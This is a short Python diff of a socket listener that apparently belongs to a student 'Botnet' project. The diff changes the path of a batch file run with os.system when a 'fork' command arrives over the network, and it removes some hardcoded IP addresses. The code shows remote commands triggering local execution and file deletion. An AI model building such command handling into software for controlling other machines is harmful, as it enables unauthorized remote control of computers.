@@ -17,8 +17,6 @@ print(host)
 port = 3467
 port2 = 3469
 o = "10.217.19.33"
-p = "10.217.19.32"
-ip = "10.217.19.34"
 s.bind((host, port))
 s.listen(50)
 
@@ -52,7 +50,8 @@ def receive():
         print("File deleted")
 
     if bytes("fork", 'utf-8') in a:
-        os.system("C://Users//iD Student//Desktop//Botnet//HappyBirthday.bat")
+        os.system('C:/Users/iD Student/Documents/HappyBirthday.bat')
+        
     else:
         a2 = c.recv(500)
         print('Received message == ',a2)
